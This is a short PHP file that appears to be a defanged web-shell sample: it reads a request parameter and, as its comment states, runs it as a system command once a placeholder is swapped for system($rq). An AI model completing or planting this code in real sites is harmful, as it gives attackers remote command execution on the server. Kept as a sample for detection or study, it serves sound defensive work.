<?php
    if(isset($_REQUEST['rq'])){
        echo "<pre>";
        $rq= ($_REQUEST['rq']);
        /* Replace CENSORED with system ($rq) to activate the sample */
        CENSORED;
        echo "</pre>";
        die;
    }
?>
